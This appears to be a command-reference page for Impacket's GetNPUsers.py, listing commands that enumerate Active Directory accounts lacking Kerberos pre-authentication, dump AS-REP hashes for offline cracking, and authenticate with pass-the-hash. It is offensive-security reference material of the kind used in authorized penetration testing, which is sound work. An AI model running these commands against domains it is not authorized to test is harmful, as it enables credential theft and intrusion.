<h1>GetNPUsers.py</h1>

<blockquote><p>Enumerate Active Directory accounts with Kerberos pre-authentication disabled, which may be susceptible to AS-REP roasting attacks.
Part of the Impacket suite.
More information: <a href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a>.</p></blockquote>

<ul>
<li>Enumerate users with Kerberos pre-authentication disabled (default anonymous enumeration):</li>
</ul>


<p><code>GetNPUsers.py {{domain}}/ -usersfile {{path/to/userslist}} -dc-ip {{domain_controller_ip}}</code></p>

<ul>
<li>Perform AS-REP roasting and dump crackable hashes for offline cracking:</li>
</ul>


<p><code>GetNPUsers.py {{domain}}/ -usersfile {{path/to/userslist}} -dc-ip {{domain_controller_ip}} -request</code></p>

<ul>
<li>Authenticate with valid credentials (if anonymous binding is disabled):</li>
</ul>


<p><code>GetNPUsers.py {{domain}}/{{username}}:{{password}} -usersfile {{path/to/userslist}} -dc-ip {{domain_controller_ip}}</code></p>

<ul>
<li>Use pass-the-hash authentication instead of a password:</li>
</ul>


<p><code>GetNPUsers.py {{domain}}/{{username}} -hashes {{LM_Hash}}:{{NT_Hash}} -usersfile {{path/to/userslist}} -dc-ip {{domain_controller_ip}}</code></p>

<ul>
<li>Save the output to a file for further analysis:</li>
</ul>


<p><code>GetNPUsers.py {{domain}}/ -usersfile {{path/to/userslist}} -dc-ip {{domain_controller_ip}} -request &gt; {{path/to/output.txt}}</code></p>
